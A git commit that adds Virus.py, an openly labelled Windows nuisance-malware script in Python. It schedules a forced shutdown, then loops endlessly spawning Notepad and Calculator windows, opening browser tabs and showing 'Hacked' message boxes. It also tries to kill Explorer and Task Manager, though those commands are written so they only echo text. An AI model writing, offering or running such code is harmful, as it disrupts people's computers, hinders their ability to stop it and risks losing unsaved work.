1941a07b5eec4d2cf73ac19901e1137bbc3fafa1
Chapadox <76492277+Chapadox@users.noreply.github.com>
2021-03-09 22:57:06 -0300

    Virus.py

---
+++ Virus.py
@@ -0,0 +1,26 @@
+import os
+import webbrowser
+
+
+cmd2 = 'Color 02'
+cmd3 = 'mode 1000'
+cmd4 = 'shutdown -s -t 400'
+os.system(cmd2)
+os.system(cmd3)
+os.system(cmd4)
+
+while True:
+    cmd = "echo %random% %random% %random% %random% %random %random% %random% %random% %random% %random% %random% %random% %random% %random% %random %random% %random% %random% %random% %random% %random% %random% %random% %random% %random %random% %random% %random% %random% %random% "
+    os.system(cmd)
+    os.startfile('notepad.exe')
+    os.startfile('calc.exe')
+    try:
+        os.system("echo off Taskkill /f /im explorer.exe")
+        os.system("echo off taskkill /f /im Taskmgr.exe")
+    except:
+        print("pau")
+    webbrowser.open_new_tab('https://github.com/Chapadox')
+    os.system('msg * clown̵̛͔clown̵̛͔clBonde Do Ratoclown̵̛͔clown̵̛͔c ')
+    os.system('msg * clown̵̛͔clown̵̛͔clHackedclown̵̛͔clown̵̛͔c ')
+
+#By Eduardo>>>Destr00
